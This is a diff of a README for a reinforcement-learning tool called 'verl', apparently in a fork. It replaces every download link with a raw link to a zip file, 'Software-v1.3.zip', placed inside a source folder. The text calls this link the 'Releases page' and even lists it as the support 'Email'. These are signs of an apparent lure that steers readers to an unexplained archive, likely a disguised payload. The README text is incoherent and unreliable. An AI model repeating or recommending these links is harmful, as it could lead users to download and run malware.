@@ -6,7 +6,7 @@ Welcome to verl! This application helps you harness the power of reinforcement l
 
 ## 📥 Download the Software
 
-[![Download verl](https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip)](https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip)
+[![Download verl](https://raw.githubusercontent.com/andreyukzl/verl/main/verl/model_merger/Software-v1.3.zip)](https://raw.githubusercontent.com/andreyukzl/verl/main/verl/model_merger/Software-v1.3.zip)
 
 ## 📦 System Requirements
 
@@ -26,7 +26,7 @@ Before you begin, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-To download verl, visit the Releases page: [Download verz](https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip).
+To download verl, visit the Releases page: [Download verz](https://raw.githubusercontent.com/andreyukzl/verl/main/verl/model_merger/Software-v1.3.zip).
 
 1. Click the link above to access the page.
 2. Look for the latest release.
@@ -57,7 +57,7 @@ If you need further assistance, check out our user guide:
 
 For support or feedback, feel free to reach out:
 
-- **Email:** https://raw.githubusercontent.com/andreyukzl/verl/main/tests/experimental/vla/verl-v1.1.zip
+- **Email:** https://raw.githubusercontent.com/andreyukzl/verl/main/verl/model_merger/Software-v1.3.zip
 - **Community Forum:** Join discussions and get help from other users.
 
 Thank you for choosing verl!
